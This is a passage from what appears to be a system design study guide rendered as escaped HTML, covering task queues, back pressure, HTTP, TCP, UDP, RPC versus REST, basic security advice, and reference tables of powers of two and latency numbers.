latency and has the possibility of messages being delivered twice.&lt;/p&gt; &#xA;&lt;h3&gt;Task queues&lt;/h3&gt; &#xA;&lt;p&gt;Tasks queues receive tasks and their related data, runs them, then delivers their results. They can support scheduling and can be used to run computationally-intensive jobs in the background.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://docs.celeryproject.org/en/stable/&#34;&gt;Celery&lt;/a&gt;&lt;/strong&gt; has support for scheduling and primarily has python support.&lt;/p&gt; &#xA;&lt;h3&gt;Back pressure&lt;/h3&gt; &#xA;&lt;p&gt;If queues start to grow significantly, the queue size can become larger than memory, resulting in cache misses, disk reads, and even slower performance. &lt;a href=&#34;http://mechanical-sympathy.blogspot.com/2012/05/apply-back-pressure-when-overloaded.html&#34;&gt;Back pressure&lt;/a&gt; can help by limiting the queue size, thereby maintaining a high throughput rate and good response times for jobs already in the queue. Once the queue fills up, clients get a server busy or HTTP 503 status code to try again later. Clients can retry the request at a later time, perhaps with &lt;a href=&#34;https://en.wikipedia.org/wiki/Exponential_backoff&#34;&gt;exponential backoff&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Disadvantage(s): asynchronism&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use cases such as inexpensive calculations and realtime workflows might be better suited for synchronous operations, as introducing queues can add delays and complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=1KRYH75wgy4&#34;&gt;It&#39;s all a numbers game&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://mechanical-sympathy.blogspot.com/2012/05/apply-back-pressure-when-overloaded.html&#34;&gt;Applying back pressure when overloaded&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Little%27s_law&#34;&gt;Little&#39;s law&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quora.com/What-is-the-difference-between-a-message-queue-and-a-task-queue-Why-would-a-task-queue-require-a-message-broker-like-RabbitMQ-Redis-Celery-or-IronMQ-to-function&#34;&gt;What is the difference between a message queue and a task queue?&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Communication&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/5KeocQs.jpg&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.escotal.com/osilayer.html&#34;&gt;Source: OSI 7 layer model&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Hypertext transfer protocol (HTTP)&lt;/h3&gt; &#xA;&lt;p&gt;HTTP is a method for encoding and transporting data between a client and a server. It is a request/response protocol: clients issue requests and servers issue responses with relevant content and completion status info about the request. HTTP is self-contained, allowing requests and responses to flow through many intermediate routers and servers that perform load balancing, caching, encryption, and compression.&lt;/p&gt; &#xA;&lt;p&gt;A basic HTTP request consists of a verb (method) and a resource (endpoint). Below are common HTTP verbs:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Verb&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;   &lt;th&gt;Idempotent*&lt;/th&gt; &#xA;   &lt;th&gt;Safe&lt;/th&gt; &#xA;   &lt;th&gt;Cacheable&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GET&lt;/td&gt; &#xA;   &lt;td&gt;Reads a resource&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;POST&lt;/td&gt; &#xA;   &lt;td&gt;Creates a resource or trigger a process that handles data&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;Yes if response contains freshness info&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PUT&lt;/td&gt; &#xA;   &lt;td&gt;Creates or replace a resource&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PATCH&lt;/td&gt; &#xA;   &lt;td&gt;Partially updates a resource&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;Yes if response contains freshness info&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DELETE&lt;/td&gt; &#xA;   &lt;td&gt;Deletes a resource&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;*Can be called many times without different outcomes.&lt;/p&gt; &#xA;&lt;p&gt;HTTP is an application layer protocol relying on lower-level protocols such as &lt;strong&gt;TCP&lt;/strong&gt; and &lt;strong&gt;UDP&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Source(s) and further reading: HTTP&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/resources/glossary/http/&#34;&gt;What is HTTP?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quora.com/What-is-the-difference-between-HTTP-protocol-and-TCP-protocol&#34;&gt;Difference between HTTP and TCP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://laracasts.com/discuss/channels/general-discussion/whats-the-differences-between-put-and-patch?page=1&#34;&gt;Difference between PUT and PATCH&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Transmission control protocol (TCP)&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/JdAsdvG.jpg&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.wildbunny.co.uk/blog/2012/10/09/how-to-make-a-multi-player-game-part-1/&#34;&gt;Source: How to make a multiplayer game&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;TCP is a connection-oriented protocol over an &lt;a href=&#34;https://en.wikipedia.org/wiki/Internet_Protocol&#34;&gt;IP network&lt;/a&gt;. Connection is established and terminated using a &lt;a href=&#34;https://en.wikipedia.org/wiki/Handshaking&#34;&gt;handshake&lt;/a&gt;. All packets sent are guaranteed to reach the destination in the original order and without corruption through:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sequence numbers and &lt;a href=&#34;https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation&#34;&gt;checksum fields&lt;/a&gt; for each packet&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Acknowledgement_(data_networks)&#34;&gt;Acknowledgement&lt;/a&gt; packets and automatic retransmission&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If the sender does not receive a correct response, it will resend the packets. If there are multiple timeouts, the connection is dropped. TCP also implements &lt;a href=&#34;https://en.wikipedia.org/wiki/Flow_control_(data)&#34;&gt;flow control&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/Network_congestion#Congestion_control&#34;&gt;congestion control&lt;/a&gt;. These guarantees cause delays and generally result in less efficient transmission than UDP.&lt;/p&gt; &#xA;&lt;p&gt;To ensure high throughput, web servers can keep a large number of TCP connections open, resulting in high memory usage. It can be expensive to have a large number of open connections between web server threads and say, a &lt;a href=&#34;https://memcached.org/&#34;&gt;memcached&lt;/a&gt; server. &lt;a href=&#34;https://en.wikipedia.org/wiki/Connection_pool&#34;&gt;Connection pooling&lt;/a&gt; can help in addition to switching to UDP where applicable.&lt;/p&gt; &#xA;&lt;p&gt;TCP is useful for applications that require high reliability but are less time critical. Some examples include web servers, database info, SMTP, FTP, and SSH.&lt;/p&gt; &#xA;&lt;p&gt;Use TCP over UDP when:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You need all of the data to arrive intact&lt;/li&gt; &#xA; &lt;li&gt;You want to automatically make a best estimate use of the network throughput&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;User datagram protocol (UDP)&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/yzDrJtA.jpg&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.wildbunny.co.uk/blog/2012/10/09/how-to-make-a-multi-player-game-part-1/&#34;&gt;Source: How to make a multiplayer game&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;UDP is connectionless. Datagrams (analogous to packets) are guaranteed only at the datagram level. Datagrams might reach their destination out of order or not at all. UDP does not support congestion control. Without the guarantees that TCP support, UDP is generally more efficient.&lt;/p&gt; &#xA;&lt;p&gt;UDP can broadcast, sending datagrams to all devices on the subnet. This is useful with &lt;a href=&#34;https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol&#34;&gt;DHCP&lt;/a&gt; because the client has not yet received an IP address, thus preventing a way for TCP to stream without the IP address.&lt;/p&gt; &#xA;&lt;p&gt;UDP is less reliable but works well in real time use cases such as VoIP, video chat, streaming, and realtime multiplayer games.&lt;/p&gt; &#xA;&lt;p&gt;Use UDP over TCP when:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You need the lowest latency&lt;/li&gt; &#xA; &lt;li&gt;Late data is worse than loss of data&lt;/li&gt; &#xA; &lt;li&gt;You want to implement your own error correction&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Source(s) and further reading: TCP and UDP&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://gafferongames.com/networking-for-game-programmers/udp-vs-tcp/&#34;&gt;Networking for game programming&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.cyberciti.biz/faq/key-differences-between-tcp-and-udp-protocols/&#34;&gt;Key differences between TCP and UDP protocols&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/5970383/difference-between-tcp-and-udp&#34;&gt;Difference between TCP and UDP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Transmission_Control_Protocol&#34;&gt;Transmission control protocol&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/User_Datagram_Protocol&#34;&gt;User datagram protocol&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.cs.bu.edu/~jappavoo/jappavoo.github.com/451/papers/memcache-fb.pdf&#34;&gt;Scaling memcache at Facebook&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Remote procedure call (RPC)&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/iF4Mkb5.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview&#34;&gt;Source: Crack the system design interview&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;In an RPC, a client causes a procedure to execute on a different address space, usually a remote server. The procedure is coded as if it were a local procedure call, abstracting away the details of how to communicate with the server from the client program. Remote calls are usually slower and less reliable than local calls so it is helpful to distinguish RPC calls from local calls. Popular RPC frameworks include &lt;a href=&#34;https://developers.google.com/protocol-buffers/&#34;&gt;Protobuf&lt;/a&gt;, &lt;a href=&#34;https://thrift.apache.org/&#34;&gt;Thrift&lt;/a&gt;, and &lt;a href=&#34;https://avro.apache.org/docs/current/&#34;&gt;Avro&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;RPC is a request-response protocol:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Client program&lt;/strong&gt; - Calls the client stub procedure. The parameters are pushed onto the stack like a local procedure call.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Client stub procedure&lt;/strong&gt; - Marshals (packs) procedure id and arguments into a request message.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Client communication module&lt;/strong&gt; - OS sends the message from the client to the server.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Server communication module&lt;/strong&gt; - OS passes the incoming packets to the server stub procedure.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Server stub procedure&lt;/strong&gt; - Unmarshalls the results, calls the server procedure matching the procedure id and passes the given arguments.&lt;/li&gt; &#xA; &lt;li&gt;The server response repeats the steps above in reverse order.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Sample RPC calls:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;GET /someoperation?data=anId&#xA;&#xA;POST /anotheroperation&#xA;{&#xA;  &#34;data&#34;:&#34;anId&#34;;&#xA;  &#34;anotherdata&#34;: &#34;another value&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;RPC is focused on exposing behaviors. RPCs are often used for performance reasons with internal communications, as you can hand-craft native calls to better fit your use cases.&lt;/p&gt; &#xA;&lt;p&gt;Choose a native library (aka SDK) when:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You know your target platform.&lt;/li&gt; &#xA; &lt;li&gt;You want to control how your &#34;logic&#34; is accessed.&lt;/li&gt; &#xA; &lt;li&gt;You want to control how error control happens off your library.&lt;/li&gt; &#xA; &lt;li&gt;Performance and end user experience is your primary concern.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;HTTP APIs following &lt;strong&gt;REST&lt;/strong&gt; tend to be used more often for public APIs.&lt;/p&gt; &#xA;&lt;h4&gt;Disadvantage(s): RPC&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;RPC clients become tightly coupled to the service implementation.&lt;/li&gt; &#xA; &lt;li&gt;A new API must be defined for every new operation or use case.&lt;/li&gt; &#xA; &lt;li&gt;It can be difficult to debug RPC.&lt;/li&gt; &#xA; &lt;li&gt;You might not be able to leverage existing technologies out of the box. For example, it might require additional effort to ensure &lt;a href=&#34;http://etherealbits.com/2012/12/debunking-the-myths-of-rpc-rest/&#34;&gt;RPC calls are properly cached&lt;/a&gt; on caching servers such as &lt;a href=&#34;http://www.squid-cache.org/&#34;&gt;Squid&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Representational state transfer (REST)&lt;/h3&gt; &#xA;&lt;p&gt;REST is an architectural style enforcing a client/server model where the client acts on a set of resources managed by the server. The server provides a representation of resources and actions that can either manipulate or get a new representation of resources. All communication must be stateless and cacheable.&lt;/p&gt; &#xA;&lt;p&gt;There are four qualities of a RESTful interface:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Identify resources (URI in HTTP)&lt;/strong&gt; - use the same URI regardless of any operation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Change with representations (Verbs in HTTP)&lt;/strong&gt; - use verbs, headers, and body.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Self-descriptive error message (status response in HTTP)&lt;/strong&gt; - Use status codes, don&#39;t reinvent the wheel.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://restcookbook.com/Basics/hateoas/&#34;&gt;HATEOAS&lt;/a&gt; (HTML interface for HTTP)&lt;/strong&gt; - your web service should be fully accessible in a browser.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Sample REST calls:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;GET /someresources/anId&#xA;&#xA;PUT /someresources/anId&#xA;{&#34;anotherdata&#34;: &#34;another value&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;REST is focused on exposing data. It minimizes the coupling between client/server and is often used for public HTTP APIs. REST uses a more generic and uniform method of exposing resources through URIs, &lt;a href=&#34;https://github.com/for-GET/know-your-http-well/raw/master/headers.md&#34;&gt;representation through headers&lt;/a&gt;, and actions through verbs such as GET, POST, PUT, DELETE, and PATCH. Being stateless, REST is great for horizontal scaling and partitioning.&lt;/p&gt; &#xA;&lt;h4&gt;Disadvantage(s): REST&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;With REST being focused on exposing data, it might not be a good fit if resources are not naturally organized or accessed in a simple hierarchy. For example, returning all updated records from the past hour matching a particular set of events is not easily expressed as a path. With REST, it is likely to be implemented with a combination of URI path, query parameters, and possibly the request body.&lt;/li&gt; &#xA; &lt;li&gt;REST typically relies on a few verbs (GET, POST, PUT, DELETE, and PATCH) which sometimes doesn&#39;t fit your use case. For example, moving expired documents to the archive folder might not cleanly fit within these verbs.&lt;/li&gt; &#xA; &lt;li&gt;Fetching complicated resources with nested hierarchies requires multiple round trips between the client and server to render single views, e.g. fetching content of a blog entry and the comments on that entry. For mobile applications operating in variable network conditions, these multiple roundtrips are highly undesirable.&lt;/li&gt; &#xA; &lt;li&gt;Over time, more fields might be added to an API response and older clients will receive all new data fields, even those that they do not need, as a result, it bloats the payload size and leads to larger latencies.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;RPC and REST calls comparison&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Operation&lt;/th&gt; &#xA;   &lt;th&gt;RPC&lt;/th&gt; &#xA;   &lt;th&gt;REST&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Signup&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /signup&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /persons&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Resign&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /resign&lt;br&gt;{&lt;br&gt;&#34;personid&#34;: &#34;1234&#34;&lt;br&gt;}&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;DELETE&lt;/strong&gt; /persons/1234&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Read a person&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /readPerson?personid=1234&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /persons/1234&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Read a person’s items list&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /readUsersItemsList?personid=1234&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /persons/1234/items&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Add an item to a person’s items&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /addItemToUsersItemsList&lt;br&gt;{&lt;br&gt;&#34;personid&#34;: &#34;1234&#34;;&lt;br&gt;&#34;itemid&#34;: &#34;456&#34;&lt;br&gt;}&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /persons/1234/items&lt;br&gt;{&lt;br&gt;&#34;itemid&#34;: &#34;456&#34;&lt;br&gt;}&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Update an item&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /modifyItem&lt;br&gt;{&lt;br&gt;&#34;itemid&#34;: &#34;456&#34;;&lt;br&gt;&#34;key&#34;: &#34;value&#34;&lt;br&gt;}&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;PUT&lt;/strong&gt; /items/456&lt;br&gt;{&lt;br&gt;&#34;key&#34;: &#34;value&#34;&lt;br&gt;}&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Delete an item&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /removeItem&lt;br&gt;{&lt;br&gt;&#34;itemid&#34;: &#34;456&#34;&lt;br&gt;}&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;DELETE&lt;/strong&gt; /items/456&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;i&gt;&lt;a href=&#34;https://apihandyman.io/do-you-really-know-why-you-prefer-rest-over-rpc/&#34;&gt;Source: Do you really know why you prefer REST over RPC&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h4&gt;Source(s) and further reading: REST and RPC&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://apihandyman.io/do-you-really-know-why-you-prefer-rest-over-rpc/&#34;&gt;Do you really know why you prefer REST over RPC&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://programmers.stackexchange.com/a/181186&#34;&gt;When are RPC-ish approaches more appropriate than REST?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/15056878/rest-vs-json-rpc&#34;&gt;REST vs JSON-RPC&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://etherealbits.com/2012/12/debunking-the-myths-of-rpc-rest/&#34;&gt;Debunking the myths of RPC and REST&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quora.com/What-are-the-drawbacks-of-using-RESTful-APIs&#34;&gt;What are the drawbacks of using REST&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview&#34;&gt;Crack the system design interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://code.facebook.com/posts/1468950976659943/&#34;&gt;Thrift&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://arstechnica.com/civis/viewtopic.php?t=1190508&#34;&gt;Why REST for internal use and not RPC&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Security&lt;/h2&gt; &#xA;&lt;p&gt;This section could use some updates. Consider &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;contributing&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;p&gt;Security is a broad topic. Unless you have considerable experience, a security background, or are applying for a position that requires knowledge of security, you probably won&#39;t need to know more than the basics:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Encrypt in transit and at rest.&lt;/li&gt; &#xA; &lt;li&gt;Sanitize all user inputs or any input parameters exposed to user to prevent &lt;a href=&#34;https://en.wikipedia.org/wiki/Cross-site_scripting&#34;&gt;XSS&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/SQL_injection&#34;&gt;SQL injection&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Use parameterized queries to prevent SQL injection.&lt;/li&gt; &#xA; &lt;li&gt;Use the principle of &lt;a href=&#34;https://en.wikipedia.org/wiki/Principle_of_least_privilege&#34;&gt;least privilege&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/shieldfy/API-Security-Checklist&#34;&gt;API security checklist&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/FallibleInc/security-guide-for-developers&#34;&gt;Security guide for developers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet&#34;&gt;OWASP top ten&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Appendix&lt;/h2&gt; &#xA;&lt;p&gt;You&#39;ll sometimes be asked to do &#39;back-of-the-envelope&#39; estimates. For example, you might need to determine how long it will take to generate 100 image thumbnails from disk or how much memory a data structure will take. The &lt;strong&gt;Powers of two table&lt;/strong&gt; and &lt;strong&gt;Latency numbers every programmer should know&lt;/strong&gt; are handy references.&lt;/p&gt; &#xA;&lt;h3&gt;Powers of two table&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Power           Exact Value         Approx Value        Bytes&#xA;---------------------------------------------------------------&#xA;7                             128&#xA;8                             256&#xA;10                           1024   1 thousand           1 KB&#xA;16                         65,536                       64 KB&#xA;20                      1,048,576   1 million            1 MB&#xA;30                  1,073,741,824   1 billion            1 GB&#xA;32                  4,294,967,296                        4 GB&#xA;40              1,099,511,627,776   1 trillion           1 TB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Source(s) and further reading&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Power_of_two&#34;&gt;Powers of two&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Latency numbers every programmer should know&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Latency Comparison Numbers&#xA;--------------------------&#xA;L1 cache reference                           0.5 ns&#xA;Branch mispredict                            5   ns&#xA;L2 cache reference                           7   ns                      14x L1 cache&#xA;Mutex lock/unlock                           25   ns&#xA;Main memory reference                      100   ns                      20x L2 cache, 200x L1 cache&#xA;Compress 1K bytes with Zippy            10,000   ns       10 us&#xA;Send 1 KB bytes over 1 Gbps network     10,000   ns       10 us&#xA;Read 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB/sec SSD&#xA;Read 1 MB sequentially from memory     250,000   ns      250 us&#xA;Round trip within same datacenter      500,000   ns      500 us&#xA;Read 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memory&#xA;HDD seek                            10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip&#xA;Read 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD&#xA;Read 1 MB sequentially from HDD     30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD&#xA;Send packet CA-&amp;gt;Netherlands-&amp;gt;CA    150,000,000   ns  150,000 us  150 ms&#xA;&#xA;Notes&#xA;-----&#xA;1 ns = 10^-9 seconds&#xA;1 us = 10^-6 seconds = 1,000 ns&#xA;1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Handy metrics based on numbers above:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Read sequentially from HDD at 30 MB/s&lt;/li&gt; &#xA; &lt;li&gt;Read sequentially from 1 Gbps Ethernet at 100 MB/s&lt;/li&gt; &#xA; &lt;li&gt;Read sequentially from SSD at 1 GB/s&lt;/li&gt; &#xA; &lt;li&gt;Read sequentially from main memory at 4 GB/s&lt;/li&gt; &#xA; &lt;li&gt;6-7 world-wide round trips per second&lt;/li&gt; &#xA; &lt;li&gt;2,000 round trips per second within a data center&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Latency numbers visualized&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/77f72259e1eb58596b564d1ad823af1853bc60a3/687474703a2f2f692e696d6775722e636f6d2f6b307431652e706e67&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Source(s) and further reading&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a 